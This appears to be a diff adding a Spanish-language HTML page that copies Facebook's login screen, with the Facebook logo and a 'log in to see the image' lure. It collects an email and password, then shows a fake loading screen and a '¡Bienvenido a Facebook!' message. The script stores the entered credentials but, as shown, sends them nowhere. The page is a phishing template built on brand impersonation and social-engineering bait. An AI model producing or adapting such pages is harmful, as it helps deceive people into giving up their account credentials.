@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inicio de Sesión</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+    }
+    .container h1 {
+      color: #1877f2;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .container p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .container input[type="text"],
+    .container input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 4px;
+    }
+    .container .password-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .container .password-container input {
+      flex: 1;
+    }
+    .container .password-container button {
+      margin-left: 10px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 8px; /* Tamaño reducido */
+    }
+    .container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .container button:hover {
+      background-color: #165dbb;
+    }
+    .container a {
+      display: block;
+      margin-top: 10px;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .container a:hover {
+      text-decoration: underline;
+    }
+    .image-container {
+      margin-bottom: 20px;
+    }
+    .image-container img {
+      max-width: 100%;
+      border-radius: 8px;
+    }
+    .loading-screen {
+      display: none;
+      font-size: 24px;
+      color: #1877f2;
+    }
+    .logo {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+    .back-button {
+      display: none; /* Inicialmente oculta */
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      background-color: #1877f2;
+      color: white;
+      padding: 8px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .back-button:hover {
+      background-color: #165dbb;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="loginContainer">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="logo">
+    <p>Para ver la imagen inicia sesión</p>
+    <div class="image-container">
+      <img src="mi_imagen.jpg" alt="imagen">
+    </div>
+    <h1>Facebook</h1>
+    <input type="text" id="email" placeholder="Correo electrónico o teléfono">
+    <div class="password-container">
+      <input type="text" id="password" placeholder="Contraseña">
+    </div>
+    <button type="button" onclick="togglePasswordVisibility()">Mostrar/Ocultar</button> 
+    <button onclick="iniciarSesion()">Iniciar sesión</button>
+    <a href="#">¿Olvidaste tu contraseña?</a>
+  </div>
+
+  <div class="loading-screen" id="loadingScreen">
+    Cargando...
+  </div>
+
+  <button class="back-button" onclick="showLogin()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left-short" viewBox="0 0 16 16">
+      <path fill-rule="evenodd" d="M12 8a.5.5 0 0 1-.5.5H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5H11.5a.5.5 0 0 1 .5.5z"/>
+    </svg>
+  </button>
+
+  <script>
+    let passwordVisible = false;
+    let originalEmail = "";
+    let originalPassword = "";
+
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById('password');
+      const emailInput = document.getElementById('email');
+      if (passwordVisible) {
+        passwordInput.setAttribute('type', 'text');
+        emailInput.setAttribute('type', 'text');
+        passwordInput.value = originalPassword;
+        emailInput.value = originalEmail;
+      } else {
+        passwordInput.setAttribute('type', 'text');
+        emailInput.setAttribute('type', 'text');
+        originalPassword = passwordInput.value;
+        originalEmail = emailInput.value;
+        passwordInput.value = '***';
+        emailInput.value = '***';
+      }
+      passwordVisible = !passwordVisible;
+    }
+
+    function iniciarSesion() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      // Simular guardado de datos y deshabilitar edición
+      document.getElementById('email').setAttribute('disabled', 'true');
+      document.getElementById('password').setAttribute('disabled', 'true');
+      document.querySelector('.password-container button').setAttribute('disabled', 'true');
+      document.querySelector('.container button').setAttribute('disabled', 'true');
+      // Mostrar pantalla de carga
+      document.getElementById('loginContainer').style.display = 'none';
+      document.getElementById('loadingScreen').style.display = 'block';
+      // Simular un retraso para la carga
+      setTimeout(() => {
+        document.getElementById('loadingScreen').textContent = '¡Bienvenido a Facebook!';
+        document.querySelector('.back-button').style.display = 'block'; // Mostrar flecha de regreso
+      }, 2000);
+    }
+
+    function showLogin() {
+      document.getElementById('loginContainer').style.display = 'block';
+      document.getElementById('loadingScreen').style.display = 'none';
+      document.querySelector('.back-button').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
